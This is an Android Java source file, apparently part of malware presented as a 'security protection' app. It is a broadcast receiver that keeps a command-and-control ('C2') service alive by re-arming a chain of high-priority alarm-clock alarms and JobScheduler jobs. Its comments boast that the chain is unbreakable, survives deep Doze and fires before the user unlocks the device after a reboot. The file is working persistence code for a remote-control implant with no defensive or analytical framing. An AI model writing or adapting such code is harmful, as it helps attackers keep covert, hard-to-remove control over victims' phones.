package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * AlarmReconnectReceiver — Receives the chained alarm from PersistenceEngine.
 *
 * When it fires, it:
 *   1. Ensures CommandControlService is running
 *   2. Immediately re-arms the NEXT alarm (creating an unbreakable chain)
 *
 * setAlarmClock() alarms are shown in the lockscreen clock area and are
 * the highest-priority alarms on Android — they fire even in deep Doze.
 *
 * android:directBootAware="true" in manifest allows this to fire even
 * before the user unlocks the device after reboot (Credential Encrypted storage).
 */
public class AlarmReconnectReceiver extends BroadcastReceiver {

    private static final String TAG = "ARR";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "AlarmReconnectReceiver fired — ensuring service + rearming");

        // 1. Ensure the C2 service is running
        PersistenceEngine.ensureServiceRunning(context);

        // 2. Rearm the next alarm in the chain immediately
        try {
            PersistenceEngine.armAlarmChain(context);
        } catch (Exception e) {
            Log.e(TAG, "rearm failed: " + e.getMessage());
        }

        // 3. Also rearm JobScheduler as belt-and-suspenders
        try {
            PersistenceEngine.arm(context);
        } catch (Exception e) {
            Log.e(TAG, "arm failed: " + e.getMessage());
        }
    }
}
